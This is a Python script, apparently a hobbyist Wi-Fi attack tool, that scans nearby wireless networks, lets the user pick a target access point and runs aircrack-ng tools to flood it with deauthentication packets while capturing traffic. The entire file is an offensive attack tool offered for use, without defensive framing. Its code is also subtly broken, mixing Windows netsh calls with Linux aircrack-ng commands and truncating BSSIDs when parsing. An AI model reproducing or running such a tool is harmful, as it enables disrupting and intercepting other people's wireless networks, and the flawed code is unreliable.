import subprocess
import re
import time
from datetime import datetime
from colorama import init, Fore, Style
import sys

init()

def print_animated(text, color=Fore.RED, delay=0.01):
    for char in text:
        sys.stdout.write(color + char + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def get_wireless_interfaces():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                              capture_output=True, text=True)
        interfaces = []
        for line in result.stdout.split('\n'):
            if 'Name' in line:
                interface = line.split(':')[1].strip()
                interfaces.append(interface)
        return interfaces
    except Exception as e:
        print_animated(f"[x] Error getting wireless interfaces: {e}", Fore.RED)
        return []

def scan_networks(interface):
    try:
        print_animated(f"\n[>] Scanning networks on interface: {interface}", Fore.YELLOW)
        result = subprocess.run(['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
                              capture_output=True, text=True)
        
        networks = []
        current_network = {}
        
        for line in result.stdout.split('\n'):
            if 'SSID' in line and ':' in line:
                if current_network:
                    networks.append(current_network)
                current_network = {'SSID': line.split(':')[1].strip()}
            elif 'BSSID' in line:
                current_network['BSSID'] = line.split(':')[1].strip()
            elif 'Signal' in line:
                current_network['Signal'] = line.split(':')[1].strip()
            elif 'Channel' in line:
                current_network['Channel'] = line.split(':')[1].strip()
        
        if current_network:
            networks.append(current_network)
            
        return networks
    except Exception as e:
        print_animated(f"[x] Error scanning networks: {e}", Fore.RED)
        return []
def deauth_attack(interface, target_bssid, client_mac=None):
    try:
        print_animated(f"\n[>] Starting deauthentication attack on {target_bssid}", Fore.RED)
        if client_mac:
            print_animated(f"[>] Targeting client: {client_mac}", Fore.YELLOW)
            
        subprocess.run(['airmon-ng', 'start', interface])
        monitor_interface = interface + "mon"
        
        capture_file = f"capture_{int(time.time())}"
        airodump = subprocess.Popen(['airodump-ng', '-w', capture_file, '--bssid', target_bssid, monitor_interface])
        
        if client_mac:
            deauth_cmd = ['aireplay-ng', '--deauth', '10', '-a', target_bssid, '-c', client_mac, monitor_interface] 
        else:
            deauth_cmd = ['aireplay-ng', '--deauth', '10', '-a', target_bssid, monitor_interface]
            
        print_animated("[>] Sending deauthentication packets...", Fore.CYAN)
        subprocess.run(deauth_cmd)
        
        airodump.terminate()
        
        subprocess.run(['airmon-ng', 'stop', monitor_interface])
        
        print_animated("[!] Deauthentication attack completed", Fore.GREEN)
        print_animated(f"[>] Capture saved to {capture_file}", Fore.YELLOW)
        
    except Exception as e:
        print_animated(f"[x] Error during deauthentication attack: {e}", Fore.RED)
        try:
            airodump.terminate()
            subprocess.run(['airmon-ng', 'stop', monitor_interface])
        except:
            pass

def main():
    print_animated("""
    ██╗  ██╗██╗██╗    ██╗ █████╗     █████╗ ██╗██████╗  ██████╗ █████╗ ██╗  ██╗
    ╚██╗██╔╝██║██║    ██║██╔══██╗   ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██║ ██╔╝
     ╚███╔╝ ██║██║ █╗ ██║███████║   ███████║██║██████╔╝██║     ███████║█████╔╝ 
     ██╔██╗ ██║██║███╗██║██╔══██║   ██╔══██║██║██╔══██╗██║     ██╔══██║██╔═██╗ 
    ██╔╝ ██╗██║╚███╔███╔╝██║  ██║   ██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██╗
    ╚═╝  ╚═╝╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝
    """, Fore.RED, 0.001)
    
    interfaces = get_wireless_interfaces()
    if not interfaces:
        print_animated("[x] No wireless interfaces found", Fore.RED)
        return
    
    print_animated("\n[>] Available wireless interfaces:", Fore.YELLOW)
    for i, interface in enumerate(interfaces, 1):
        print_animated(f"{i}. {interface}", Fore.CYAN)
    
    while True:
        try:
            choice = int(input("\n[>] Select interface number: "))
            if 1 <= choice <= len(interfaces):
                selected_interface = interfaces[choice-1]
                break
            else:
                print_animated("[x] Invalid choice", Fore.RED)
        except ValueError:
            print_animated("[x] Please enter a valid number", Fore.RED)
    
    networks = scan_networks(selected_interface)
    if not networks:
        print_animated("[x] No networks found", Fore.RED)
        return
    
    print_animated("\n[>] Available networks:", Fore.YELLOW)
    for i, network in enumerate(networks, 1):
        print_animated(f"{i}. {network['SSID']} (BSSID: {network['BSSID']}, Signal: {network['Signal']})", Fore.CYAN)
    
    while True:
        try:
            choice = int(input("\n[>] Select target network number: "))
            if 1 <= choice <= len(networks):
                target_network = networks[choice-1]
                break
            else:
                print_animated("[x] Invalid choice", Fore.RED)
        except ValueError:
            print_animated("[x] Please enter a valid number", Fore.RED)
    
    deauth_attack(selected_interface, target_network['BSSID'])

if __name__ == "__main__":
    main() 